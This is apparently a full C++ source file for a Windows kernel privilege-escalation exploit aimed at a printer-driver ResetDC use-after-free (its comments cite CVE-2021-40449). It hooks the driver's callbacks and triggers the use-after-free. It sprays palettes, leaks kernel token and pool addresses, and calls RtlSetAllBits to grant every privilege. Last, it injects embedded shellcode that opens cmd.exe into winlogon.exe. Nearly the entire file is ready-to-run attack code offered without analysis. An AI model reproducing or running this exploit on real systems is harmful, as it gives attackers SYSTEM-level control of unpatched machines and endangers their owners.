#pragma warning( disable : 4005 )

#include <Windows.h>
#include <stdio.h>
#include <winddi.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>

// [Shellcode here]
// (Run cmd.exe)
unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

#define SystemHandleInformation         0x10
#define SystemBigPoolInformation        0x42
#define ThreadNameInformation           0x26

typedef BOOL (*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA *pded);
typedef DHPDEV (*DrvEnablePDEV_t)(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef VOID (*VoidFunc_t)();
typedef NTSTATUS(*NtSetInformationThread_t)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);


typedef struct _DriverHook
{
    ULONG index;
    LPVOID func;
} DriverHook;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct
{
    DWORD64 Address;
    DWORD64 PoolSize;
    CHAR PoolTag[4];
    CHAR Padding[4];
} BIG_POOL_INFO, * PBIG_POOL_INFO;

DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

DriverHook driverHooks[] = {
    {INDEX_DrvEnablePDEV, (LPVOID)hook_DrvEnablePDEV},
};

NtSetInformationThread_t SetInformationThread;
NtQuerySystemInformation_t QuerySystemInformation;

// Global variables
namespace globals
{
    LPWSTR printerName;
    HDC hdc;
    DWORD counter;
    BOOL shouldTrigger;
    VoidFunc_t origDrvFuncs[INDEX_LAST];
    DWORD64 rtlSetAllBits;
    DWORD64 fakeRtlBitMapAddr;
    DWORD currentProcessId;
}

VOID SprayPalettes(DWORD size)
{
    /* Spray palettes to reclaim freed memory */

    DWORD palCount = (size - 0x90) / 4;
    DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);

    if (lPalette == NULL) {
        puts("[-] Failed to create palette");
        return;
    }

    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);

    // Will call: RtlSetAllBits(BitMapHeader), where BitMapHeader is a forged
    // to point to the current process token (See `CreateForgedBitMapHeader`)
    // This will enable all privileges
    
    // Offset is specific to each version. Spray the two pointers
    // Arg1 (BitMapHeader)
    for (DWORD i = 0; i < 0x120; i++) {
        p[i] = globals::fakeRtlBitMapAddr;
        // p[0xe5] = globals::fakeRtlBitMapAddr;
    }

    // Function pointer (RtlSetAllBits)
    for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) {
        p[i] = globals::rtlSetAllBits;
        // p[0x15b] = globals::rtlSetAllBits;
    }


    lPalette->palNumEntries = (WORD)palCount;
    lPalette->palVersion = 0x300;

    // Create lots of palettes
    for (DWORD i = 0; i < 0x5000; i++)
    {
        CreatePalette(lPalette);
    }
}

DHPDEV hook_DrvEnablePDEV(DEVMODEW *pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF *phsurfPatterns, ULONG cjCaps, ULONG *pdevcaps, ULONG cjDevInfo, DEVINFO *pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
    puts("[*] Hooked DrvEnablePDEV called");

    DHPDEV res = ((DrvEnablePDEV_t)globals::origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

    // Check if we should trigger the vulnerability
    if (globals::shouldTrigger == TRUE)
    {
        // We only want to trigger the vulnerability once
        globals::shouldTrigger = FALSE;

        // Trigger vulnerability with second ResetDC. This will destroy the original
        // device context, while we're still inside of the first ResetDC. This will
        // result in a UAF
        puts("[*] Triggering UAF with second ResetDC");
        HDC tmp_hdc = ResetDCW(globals::hdc, NULL);
        puts("[*] Returned from second ResetDC");

        // This is where we reclaim the freed memory and overwrite the function pointer
        // and argument. We will use palettes to reclaim the freed memory

        puts("[*] Spraying palettes");
        
        SprayPalettes(0xe20);

        puts("[*] Done spraying palettes");
    }

    return res;
}

BOOL SetupUsermodeCallbackHook()
{
    /* Find and hook a printer's usermode callbacks */

    DrvEnableDriver_t DrvEnableDriver;
    VoidFunc_t DrvDisableDriver;
    DWORD pcbNeeded, pcbReturned, lpflOldProtect, _lpflOldProtect;
    PRINTER_INFO_4W *pPrinterEnum, *printerInfo;
    HANDLE hPrinter;
    DRIVER_INFO_2W *driverInfo;
    HMODULE hModule;
    DRVENABLEDATA drvEnableData;
    BOOL res;

    // Find available printers
    EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);

    if (pcbNeeded <= 0)
    {
        puts("[-] Failed to find any available printers");
        return FALSE;
    }

    pPrinterEnum = (PRINTER_INFO_4W *)malloc(pcbNeeded);

    if (pPrinterEnum == NULL)
    {
        puts("[-] Failed to allocate buffer for pPrinterEnum");
        return FALSE;
    }

    res = EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)pPrinterEnum, pcbNeeded, &pcbNeeded, &pcbReturned);

    if (res == FALSE || pcbReturned <= 0)
    {
        puts("[-] Failed to enumerate printers");
        return FALSE;
    }

    // Loop over printers
    for (DWORD i = 0; i < pcbReturned; i++)
    {
        printerInfo = &pPrinterEnum[0];

        printf("[*] Using printer: %ws\n", printerInfo->pPrinterName);

        // Open printer
        res = OpenPrinterW(printerInfo->pPrinterName, &hPrinter, NULL);
        if (!res)
        {
            puts("[-] Failed to open printer");
            continue;
        }

        printf("[+] Opened printer: %ws\n", printerInfo->pPrinterName);
        globals::printerName = _wcsdup(printerInfo->pPrinterName);

        // Get the printer driver
        GetPrinterDriverW(hPrinter, NULL, 2, NULL, 0, &pcbNeeded);

        driverInfo = (DRIVER_INFO_2W *)malloc(pcbNeeded);

        res = GetPrinterDriverW(hPrinter, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);

        if (res == FALSE)
        {
            printf("[-] Failed to get printer driver\n");
            continue;
        }

        printf("[*] Driver DLL: %ws\n", driverInfo->pDriverPath);

        // Load the printer driver into memory
        hModule = LoadLibraryExW(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);

        if (hModule == NULL)
        {
            printf("[-] Failed to load printer driver\n");
            continue;
        }

        // Get printer driver's DrvEnableDriver and DrvDisableDriver
        DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
        DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");

        if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
        {
            printf("[-] Failed to get exported functions from driver\n");
            continue;
        }

        // Call DrvEnableDriver to get the printer driver's usermode callback table
        res = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData);

        if (res == FALSE)
        {
            printf("[-] Failed to enable driver\n");
            continue;
        }

        puts("[+] Enabled printer driver");

        // Unprotect the driver's usermode callback table, such that we can overwrite entries
        res = VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect);

        if (res == FALSE)
        {
            puts("[-] Failed to unprotect printer driver's usermode callback table");
            continue;
        }

        // Loop over hooks
        for (DWORD i = 0; i < sizeof(driverHooks) / sizeof(DriverHook); i++)
        {
            // Loop over driver's usermode callback table
            for (DWORD n = 0; n < drvEnableData.c; n++)
            {
                ULONG iFunc = drvEnableData.pdrvfn[n].iFunc;

                // Check if hook INDEX matches entry INDEX
                if (driverHooks[i].index == iFunc)
                {
                    // Saved original function pointer
                    globals::origDrvFuncs[iFunc] = (VoidFunc_t)drvEnableData.pdrvfn[n].pfn;
                    // Overwrite function pointer with hook function pointer
                    drvEnableData.pdrvfn[n].pfn = (PFN)driverHooks[i].func;
                    break;
                }
            }
        }

        // Disable driver
        DrvDisableDriver();

        // Restore protections for driver's usermode callback table
        VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), lpflOldProtect, &_lpflOldProtect);

        return TRUE;
    }

    return FALSE;
}

DWORD64 GetKernelBase()
{
    /* Get kernel base address of ntoskrnl.exe */

    DWORD lpcbNeeded;
    BOOL res;
    DWORD64 *deviceDrivers;
    DWORD64 kernelBase;

    // Get device drivers will return an array of pointers
    // Requires at least medium integrity level
    res = EnumDeviceDrivers(NULL, 0, &lpcbNeeded);

    deviceDrivers = (DWORD64*)malloc(lpcbNeeded);

    res = EnumDeviceDrivers((LPVOID*)deviceDrivers, lpcbNeeded, &lpcbNeeded);

    if (res == FALSE) {
        return NULL;
    }

    // First entry matches ntoskrnl.exe
    kernelBase = deviceDrivers[0];

    free(deviceDrivers);

    return kernelBase;
}

DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    /* Get kernel address for handle */

    PSYSTEM_HANDLE_INFORMATION buffer;
    DWORD objTypeNumber, bufferSize;
    DWORD64 object;

    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
    bufferSize = 0x20;

    // Query handle information. This will query information for all handles on the system
    // Requires at least medium integrity level
    NTSTATUS status = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);

    if (status == (NTSTATUS)0xC0000004L)
    {
        // Buffer too small. This is always the case, since we only alloc room 0x20 bytes
        // initially, but we're receiving information for all handles on the system.
        // But if we don't allocate a buffer initially, it will fail for some reason.
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
        status = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);
    }

    if (buffer == NULL || status != 0)
    {
        return 0;
    }

    // Loop over the handles
    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

        // Check if process ID matches current process ID and if object type matches the provided object type
        if (buffer->Handles[i].UniqueProcessId == globals::currentProcessId && buffer->Handles[i].ObjectTypeIndex == type)
        {
            // Check if handle value matches
            if (handle == (HANDLE)buffer->Handles[i].HandleValue)
            {
                // Match. The kernel address will be in `Object`
                object = (DWORD64)buffer->Handles[i].Object;
                free(buffer);
                return object;
            }
        }
    }
    
    puts("[-] Could not find handle");
    free(buffer);
    
    return 0;
}

DWORD64 GetProcessTokenAddress() {
    /* Get kernel address of current process token */

    HANDLE proc, token;
    DWORD64 tokenKernelAddress;

    // Get handle for current process
    proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, globals::currentProcessId);
    if (proc == NULL) {
        puts("[-] Failed to open current process");
        return 0;
    }

    // Get handle for current process token
    if (OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token) == FALSE)
    {
        puts("[-] Failed to open process token");
        return 0;
    }

    // Get kernel address for current process token handle
    for (DWORD i = 0; i < 0x100; i++) {
        // Sometimes GetKernelPointer will fail for some reason
        // Mostly only on the the iteration
        
        tokenKernelAddress = GetKernelPointer(token, 0x5);

        if (tokenKernelAddress != 0) {
            break;
        }
    }

    if (tokenKernelAddress == 0) {
        puts("[-] Failed to get token kernel address");
        return 0;
    }

    return tokenKernelAddress;
}

DWORD64 CreateForgedBitMapHeader(DWORD64 token)
{
    /* Create a forged BitMapHeader on the large pool to be used in RtlSetAllBits */

    // Cool trick taken from:
    // https://github.com/KaLendsi/CVE-2021-40449-Exploit/blob/main/CVE-2021-40449-x64.cpp#L448
    // https://gist.github.com/hugsy/d89c6ee771a4decfdf4f088998d60d19

    DWORD dwBufSize, dwOutSize, dwThreadID, dwExpectedSize;
    HANDLE hThread;
    USHORT dwSize;
    LPVOID lpMessageToStore, pBuffer;
    UNICODE_STRING target;
    HRESULT hRes;
    ULONG_PTR StartAddress, EndAddress, ptr;
    PBIG_POOL_INFO info;

    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)NULL, 0, CREATE_SUSPENDED, &dwThreadID);

    dwSize = 0x1000;

    lpMessageToStore = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);

    memset(lpMessageToStore, 0x41, 0x20);

    // BitMapHeader->SizeOfBitMap
    *(DWORD64*)lpMessageToStore = 0x80;

    // BitMapHeader->Buffer
    *(DWORD64*)((DWORD64)lpMessageToStore + 8) = token;

    target = {};

    target.Length = dwSize;
    target.MaximumLength = 0xffff;
    target.Buffer = (PWSTR)lpMessageToStore;

    hRes = SetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);

    dwBufSize = 1024 * 1024;
    pBuffer = LocalAlloc(LPTR, dwBufSize);

    hRes = QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);

    dwExpectedSize = target.Length + sizeof(UNICODE_STRING);

    StartAddress = (ULONG_PTR)pBuffer;
    EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
    ptr = StartAddress + 8;
    while (ptr < EndAddress)
    {
        info = (PBIG_POOL_INFO)ptr;

        if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
        {
            return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
        }
        ptr += sizeof(BIG_POOL_INFO);
    }

    printf("[-] Failed to leak pool address for forged BitMapHeader\n");

    return NULL;
}

BOOL Setup() {
    DWORD64 kernelBase, tokenKernelAddress, rtlSetAllBitsOffset;
    HMODULE kernelModule, ntdllModule;

    ntdllModule = LoadLibraryW(L"ntdll.dll");

    if (ntdllModule == NULL) {
        puts("[-] Failed to load NTDLL");
        return FALSE;
    }

    globals::currentProcessId = GetCurrentProcessId();

    SetInformationThread = (NtSetInformationThread_t)GetProcAddress(ntdllModule, "NtSetInformationThread");
    QuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdllModule, "NtQuerySystemInformation");

    kernelBase = GetKernelBase();
    if (kernelBase == NULL) {
        puts("[-] Failed to get kernel base");
        return FALSE;
    }

    kernelModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (kernelModule == NULL) {
        puts("[-] Failed to load kernel module");
        return FALSE;
    }

    tokenKernelAddress = GetProcessTokenAddress();

    if (tokenKernelAddress == 0) {
        puts("[-] Failed to get token kernel address");
        return FALSE;
    }

    rtlSetAllBitsOffset = (DWORD64)GetProcAddress(kernelModule, "RtlSetAllBits");
    if (rtlSetAllBitsOffset == NULL) {
        puts("[-] Failed to find RtlSetAllBits");
        return FALSE;
    }

    globals::rtlSetAllBits = (DWORD64)kernelBase + rtlSetAllBitsOffset - (DWORD64)kernelModule;

    globals::fakeRtlBitMapAddr = CreateForgedBitMapHeader(tokenKernelAddress + 0x40);
    if (globals::fakeRtlBitMapAddr == NULL) {
        puts("[-] Failed to pool leak address of token");
        return FALSE;
    }

    return SetupUsermodeCallbackHook();
}

VOID InjectToWinlogon()
{
    /* Inject `payload` (shellcode) into winlogon.exe */

    PROCESSENTRY32 entry;
    HANDLE snapshot, proc;

    entry.dwSize = sizeof(PROCESSENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    INT pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        puts("[-] Could not find winlogon.exe");
        return;
    }

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (proc == NULL)
    {
        puts("[-] Failed to open process. Exploit did probably not work");
        return;
    }

    LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (buffer == NULL)
    {
        printf("[-] Failed to allocate remote memory");
    }

    if (!WriteProcessMemory(proc, buffer, payload, sizeof(payload), 0))
    {
        puts("[-] Failed to write to remote memory");
        return;
    }

    HANDLE hthread = CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        puts("[-] Failed to create remote thread");
        return;
    }
}

INT main()
{
    BOOL res = FALSE;

    res = Setup();

    if (res == FALSE) {
        puts("[-] Failed to setup exploit");
        return 0;
    }


    // Create new device context for printer with driver's hooked callbacks
    globals::hdc = CreateDCW(NULL, globals::printerName, NULL, NULL);
    if (globals::hdc == NULL)
    {
        puts("[-] Failed to create device context");
        return -1;
    }

    // Trigger the vulnerability
    // This will internally call `hdcOpenDCW` which will call our usermode callback
    // From here we will call ResetDC again to trigger the UAF
    globals::shouldTrigger = TRUE;
    ResetDC(globals::hdc, NULL);

    // Exploit complete
    // We should now have all privileges

    puts("[*] Spawning remote thread");

    InjectToWinlogon();

    return 0;
}
